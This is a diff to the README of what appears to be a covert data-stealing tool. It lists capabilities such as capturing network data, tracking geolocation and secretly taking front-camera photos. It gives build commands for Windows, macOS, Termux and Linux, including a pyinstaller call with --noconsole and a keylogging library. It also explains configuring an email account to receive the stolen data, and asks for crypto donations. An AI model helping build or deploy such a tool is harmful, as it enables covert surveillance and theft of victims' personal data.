@@ -17,7 +17,7 @@ Network Data: Captures IP addresses, MAC addresses, and more.
 Geolocation Tracking: Provides approximate location details.
 Camera Access: Takes images using the front camera (if available).
 Installation and Setup
-1. Windows
+Windows
 Open PowerShell or Command Prompt.
 Clone this repository:
 bash
@@ -37,7 +37,7 @@ bash
 Copy code
 pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py
 The executable will be located in the dist folder.
-2. macOS
+macOS
 Open the Terminal.
 Clone this repository:
 bash
@@ -57,7 +57,7 @@ bash
 Copy code
 pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py
 The executable will be located in the dist folder.
-3. Termux (Android)
+Termux (Android)
 Install Termux from F-Droid or the Google Play Store.
 Update packages:
 bash
@@ -80,7 +80,7 @@ Run the script:
 bash
 Copy code
 python Run.py
-4. Linux
+Linux
 Open the Terminal.
 Clone this repository:
 bash
@@ -101,19 +101,17 @@ Copy code
 pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py
 The executable will be located in the dist folder.
 Usage Instructions
-Email Configuration:
+Email Configuration
 During setup, you’ll need to provide:
 
 The sender email.
 The app password (generated through your email provider).
 The recipient email address for receiving data.
-Run the Script:
 Follow the platform-specific instructions to execute the script and ensure that data is sent correctly to your email.
 
 Support
 BTC Wallet: bc1q3kqdczj6q780y642yq9dvvfuk43g5a5uxn83f2
 Ethereum Wallet: 0xE8e903eE127113c30aFd52acbDbdB567968534Ea
-
 Feel free to support or donate if this tool was helpful to you! 😊
 
 Disclaimer
